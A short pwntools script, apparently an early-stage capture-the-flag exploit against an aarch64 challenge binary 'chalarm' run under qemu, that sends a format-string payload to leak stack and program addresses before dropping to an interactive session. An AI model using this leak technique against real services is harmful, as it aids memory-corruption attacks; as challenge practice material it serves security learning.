from pwn import *
import os

#os.environ['LD_LIBRARY_PATH'] = '.'
context.terminal = ['tmux', 'split-window', '-h']

elf = context.binary = ELF('chalarm')
libc = ELF('libc.so.6')
ld = ELF('ld-linux-aarch64.so.1')

p = process('qemu-aarch64 -g 1234 chalarm'.split())
#p = process('qemu-aarch64 chalarm'.split())

#p = remote('localhost', 5000)


p.sendlineafter(b'2. Legs\n', b'1')
p.sendlineafter(b'of?\n', b'1337')
p.sendlineafter(b'appendage? ', b'%23$p%21$p%p')
p.recv()
leaks = p.recv().split(b'0x')
main_leak = leaks[1]

print(leaks)
p.interactive()
